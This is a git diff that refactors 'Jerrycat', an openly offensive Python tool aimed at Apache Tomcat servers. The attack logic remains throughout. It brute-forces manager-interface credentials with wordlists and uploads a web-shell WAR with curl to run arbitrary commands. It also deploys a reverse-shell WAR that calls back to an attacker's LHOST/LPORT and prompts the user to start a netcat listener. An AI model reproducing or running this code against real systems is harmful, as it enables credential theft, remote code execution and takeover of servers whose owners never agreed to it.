@@ -20,8 +20,7 @@ from rich import print
 from rich.text import Text
 
 import core.utils
-
-console = Console()
+from core.Output import Output
 
 # Global variable to access state of args and my single instance of my class output (yes, not the cleanest way)
 global args
@@ -71,54 +70,8 @@ common_username: list[str] = [
     "admin"
 ]
 
-
-class output_class:
-    def __init__(self):
-        self.description = ""
-
-    def message(self, state: str, description: str, clear_before: bool) -> None:
-        self.description = description
-
-        if clear_before:
-            sys.stdout.write("\033[F")  # back to previous line
-            sys.stdout.write("\033[K")  # clear line
-
-        text = Text()
-
-        match state:
-            case "credit":
-                text.append(f"[+] ", style="pale_turquoise1")
-            case "settings":
-                text.append("[")
-                text.append("SETTINGS", style="turquoise2")
-                text.append("] ")
-            case "info":
-                text.append("[")
-                text.append("INFO", style="yellow")
-                text.append("] ")
-            case "success":
-                text.append(f"[+] ", style="spring_green2")
-            case "failed":
-                text.append(f"[-] ", style="red1")
-            case "error":
-                text.append(f"[!] ", style="orange_red1")
-            case "ongoing":
-                text.append(f"[*] ", style="turquoise2")
-            case "exit":
-                text.append("[")
-                text.append("EXITING", style="red1")
-                text.append("] ")
-
-        text.append(self.description)
-        console.print(text)
-
-    def verbose(self, state: str, description: str, clear_before: bool) -> None:
-        if args.verbose:
-            self.message(state, description, clear_before)
-
-
 # Tomcat class
-class tomcat:
+class Tomcat:
     def __init__(self, url: str):
         self.url = url
 
@@ -126,14 +79,14 @@ class tomcat:
         auth = HTTPBasicAuth(username, password)
         response = requests.get(f"{self.url}/manager/html", auth=auth)
         if response.status_code == 200:
-            output.message(state="success", description=f"{username}:{password}", clear_before=False)
+            output.message(state="success", description=f"{username}:{password}", url="")
             return username, password
         else:
-            output.verbose(state="failed", description=f"{username}:{password}", clear_before=False)
+            output.message(state="failed", description=f"{username}:{password}", url="", verbose=True)
             return None
 
 
-class unauthenticated_attack(tomcat):
+class UnauthenticatedAttack(Tomcat):
     def __init__(self, url: str, wordlist: str, userlist: str):
         super().__init__(url)
         self.userlist = userlist
@@ -146,7 +99,7 @@ class unauthenticated_attack(tomcat):
             with open(self.userlist, 'r') as file:
                 self.userlist = file.read().splitlines()
 
-        output.message(state="ongoing", description="Brute force is running...", clear_before=False)
+        output.message(state="ongoing", description="Brute force is running...", url="")
 
         with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as open_wordlist:
             passwords = open_wordlist.readlines()
@@ -168,7 +121,7 @@ class unauthenticated_attack(tomcat):
                     new_credentials = {'username': result[0], 'password': result[1]}
                     credentials.append(new_credentials)
 
-            output.message(state="success", description="Brute force done!", clear_before=False)
+            output.message(state="success", description="Brute force done!", url="")
 
             if credentials:
                 return credentials
@@ -176,7 +129,7 @@ class unauthenticated_attack(tomcat):
         return False
 
 
-class authenticated_attack(tomcat):
+class AuthenticatedAttack(Tomcat):
     def __init__(self, url: str, username: str, password: str):
         super().__init__(url)
         self.username = username
@@ -190,15 +143,15 @@ class authenticated_attack(tomcat):
 
                 if response.status_code != 200:
                     command = f"curl --upload-file resources/web_shell.war -u '{self.username}:{self.password}' '{self.url}/manager/text/deploy?path=/web_shell'"
-                    subprocess.run(command, shell=True, check=True)
+                    subprocess.run(command, shell=True, check=True, capture_output=True)
 
                 response = self.execute_webshell_cmd(cmd="whoami")
 
                 if response:
-                    output.message(state="ongoing", description="Spawning webshell...", clear_before=False)
+                    output.message(state="ongoing", description="Spawning webshell...", url="")
                 else:
-                    output.message(state="failed", description="An error occur with the webshell", clear_before=False)
-                    output.message(state="exit", description="Jobs finished ? Jobs not finished", clear_before=False)
+                    output.message(state="failed", description="An error occur with the webshell", url="")
+                    output.message(state="exit", description="Jobs finished ? Jobs not finished", url="")
                     return
 
                 cmd = ''
@@ -210,7 +163,7 @@ class authenticated_attack(tomcat):
                     if cmd != "":
                         response = self.execute_webshell_cmd(cmd=cmd)
                         if response != "":
-                            print(response)
+                            output.webshell_response(response, url="/web_shell")
 
             case "reverse":
 
@@ -218,7 +171,7 @@ class authenticated_attack(tomcat):
 
                 response = requests.get(url=f"{self.url}/reverse")
 
-                output.message(state="settings", description=f"LHOST: {args.lhost} - LPORT: {args.lport}", clear_before=False)
+                output.message(state="settings", description=f"LHOST: {args.lhost} - LPORT: {args.lport}", url="")
 
                 if response.status_code != 200:
 
@@ -230,10 +183,10 @@ class authenticated_attack(tomcat):
 
                     command = f"curl --upload-file resources/{filename}.war -u '{self.username}:{self.password}' '{self.url}/manager/text/deploy?path=/reverse'"
                     subprocess.run(command, shell=True, check=True, capture_output=True)
-                    output.message(state="success", description="Uploading revershell", clear_before=False)
+                    output.message(state="success", description="Uploading revershell", url="")
 
                     output.message(state="info", description=f"Run this cmd : nc -nlvp {args.lport}",
-                                   clear_before=False)
+                                   url="")
 
                     print("[bold red]Jerrycat[/] > Type [bold yellow]'Run'[/] when your netcat is ready")
                     print("[bold red]Jerrycat[/] > ", end="")
@@ -243,19 +196,22 @@ class authenticated_attack(tomcat):
                         print("[bold red]Jerrycat[/] > ", end="")
                         is_netcat_ready = input()
 
-                    output.message(state="success", description="Send revershell", clear_before=False)
+                    output.message(state="success", description="Send revershell", url="")
                     response = requests.get(url=f"{self.url}/reverse/")
                     if response.status_code == 200:
-                        output.message(state="exit", description="See you next time!", clear_before=False)
+                        output.message(state="exit", description="See you next time!", url="")
                     else:
-                        output.message(state="error", description=f"Oups.. seems we have an error {response.status_code} here", clear_before=False)
+                        output.message(state="error", description=f"Oups.. seems we have an error {response.status_code} here", url="")
 
     def execute_webshell_cmd(self, cmd: str):
+        # Send the GET request to the web shell
         response = requests.get(f"{self.url}/web_shell/index.jsp?cmd={cmd}")
-        soup = BeautifulSoup(response.text, 'html.parser')
-        content = soup.find_all('pre')
 
-        return content[0].text
+        pre_content = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
+
+        pre_content = re.sub(r'</?br\s*/?>', '\n', pre_content.group(1), flags=re.IGNORECASE)
+
+        return pre_content
 
 
 def main():
@@ -263,9 +219,10 @@ def main():
 
     # listen for CTRL+C
     signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(
-        output.message(state="exit", description="See you next time!", clear_before=True)))
+        output.message(state="exit", description="See you next time!", clear_before=True)
+    ))
 
-    parser = argparse.ArgumentParser(description="jerrycat the good guy !")
+    parser = argparse.ArgumentParser(description="Jerrycat the good guy !")
 
     # choose mode
     parser.add_argument('mode', metavar='MODE', type=str, choices=['brute', 'exec', 'reverse'],
@@ -296,12 +253,14 @@ def main():
     args = parser.parse_args()
 
     # instance new class
-    output = output_class()
+    output = Output(args=args)
 
     # banner draw of the tool
     print(banner())
 
-    tomcat_instance = tomcat(url=args.url)
+    output.header()
+
+    tomcat_instance = Tomcat(url=args.url)
 
     #if Version(tomcat_instance.version_detection()) < Version("10"):
     #   # make something with it later
@@ -314,18 +273,17 @@ def main():
     curl_path = shutil.which(binary_curl)
 
     if msfvenom_path is None:
-        output.message("error", f"{binary_msfvenom} is not installed", False)
+        output.message("error", f"{binary_msfvenom} is not installed", url="")
         return
 
     if curl_path is None:
-        output.message("error", f"{binary_curl} is not installed", False)
+        output.message("error", f"{binary_curl} is not installed", url="")
         return
 
     args.url = args.url.rstrip("/")
 
     if args.user and args.password:
-        core.utils.version_detection(url=args.url, username=args.user, password=args.password)
-
+        core.utils.version_detection(url=args.url, username=args.user, password=args.password, output=output)
 
     # switch for mode
     match args.mode:
@@ -334,24 +292,24 @@ def main():
             if not args.url:
                 parser.error("Url argument are require for this mode.")
             else:
-                output.message("success", "Mode Brute selected", False)
+                output.message("success", "Mode Brute selected", url="")
 
                 if not args.wordlist:
                     args.wordlist = 'resources/password-list-common-tomcat.txt'
 
-                tomcat_instance = unauthenticated_attack(url=args.url, wordlist=args.wordlist, userlist=args.userlist)
+                tomcat_instance = UnauthenticatedAttack(url=args.url, wordlist=args.wordlist, userlist=args.userlist)
                 credentials_found = tomcat_instance.brute_force()
 
                 if not credentials_found:
-                    output.message("failed", f"No user or password is matching ! :(", False)
+                    output.message("failed", f"No user or password is matching ! :(", "")
 
         # settings for exec mode
         case 'exec':
             if not all([args.url, args.user, args.password]):
                 parser.error(" url, -u, -p arguments are requires for this mode.")
             else:
-                output.message("success", "Mode Webshell selected", False)
-                webshell = authenticated_attack(url=args.url, username=args.user, password=args.password)
+                output.message("success", "Mode Webshell selected", "")
+                webshell = AuthenticatedAttack(url=args.url, username=args.user, password=args.password)
                 webshell.login(username=args.user, password=args.password)
                 webshell.upload()
 
@@ -360,8 +318,8 @@ def main():
             if not all([args.url, args.user, args.password, args.lhost, args.lport]):
                 parser.error(" -u, -p, --lhost, --lport arguments are requires for this mode.")
             else:
-                output.message("success", "Mode Reverse shell selected", False)
-                revereshell = authenticated_attack(url=args.url, username=args.user, password=args.password)
+                output.message("success", "Mode Reverse shell selected", "")
+                revereshell = AuthenticatedAttack(url=args.url, username=args.user, password=args.password)
                 revereshell.login(username=args.user, password=args.password)
                 revereshell.upload()
 
